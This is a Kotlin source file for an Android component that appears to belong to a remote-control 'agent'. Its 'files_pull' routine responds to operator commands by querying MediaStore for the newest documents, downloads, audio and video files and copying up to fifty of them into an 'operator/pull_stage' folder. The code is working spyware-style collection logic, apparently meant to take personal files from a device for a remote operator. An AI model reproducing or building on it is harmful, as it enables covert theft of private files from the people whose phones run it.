package com.wormgitty.agent

import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import java.io.File

/**
 * files_pull backend (phase-7): documents/downloads/audio/video straight
 * from MediaStore — no storage permission needed for the app's own
 * collections view on API 29+, READ_* covers the rest below that.
 * Caps: 8 MB per file, ≤50 per command (enforced by caller + here).
 */
object MediaFilesPuller {

    const val MAX_BYTES = 8_000_000L
    const val MAX_FILES = 50

    private fun uriFor(category: String): Uri? = when (category) {
        "documents", "downloads" ->
            if (Build.VERSION.SDK_INT >= 29) MediaStore.Downloads.EXTERNAL_CONTENT_URI
            else MediaStore.Files.getContentUri("external")
        "audio" -> MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
        "video" -> MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        else -> null
    }

    /**
     * Returns staged copies (in filesDir/pull) of up to [limit] newest
     * matching rows, each ≤ MAX_BYTES. null when category unknown.
     */
    fun pull(context: Context, category: String, limit: Int): List<File>? {
        val uri = uriFor(category) ?: return null
        val n = limit.coerceIn(1, MAX_FILES)
        val proj = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.MIME_TYPE,
            MediaStore.MediaColumns.DATE_ADDED,
        )
        val stage = File(context.filesDir, "operator/pull_stage").apply { mkdirs() }
        val out = mutableListOf<File>()
        val selection = if (category == "documents")
            "${MediaStore.MediaColumns.MIME_TYPE} NOT LIKE 'image/%' AND " +
                "${MediaStore.MediaColumns.MIME_TYPE} NOT LIKE 'audio/%' AND " +
                "${MediaStore.MediaColumns.MIME_TYPE} NOT LIKE 'video/%'" else null
        runCatching {
            context.contentResolver.query(
                uri, proj, selection, null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            )?.use { c ->
                val idCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val nameCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                while (c.moveToNext() && out.size < n) {
                    val size = if (sizeCol >= 0) c.getLong(sizeCol) else 0L
                    if (size <= 0 || size > MAX_BYTES) continue
                    val id = c.getLong(idCol)
                    val name = (c.getString(nameCol) ?: "file_$id")
                        .replace(Regex("[^\\w.\\-]+"), "_").takeLast(60)
                    val item = Uri.withAppendedPath(uri, id.toString())
                    val dest = File(stage, "${id}_${name}")
                    val ok = runCatching {
                        context.contentResolver.openInputStream(item)?.use { inp ->
                            dest.outputStream().use { inp.copyTo(it) }
                        } != null && dest.length() in 1..MAX_BYTES
                    }.getOrDefault(false)
                    if (ok) out += dest else dest.delete()
                }
            }
        }
        return out
    }
}
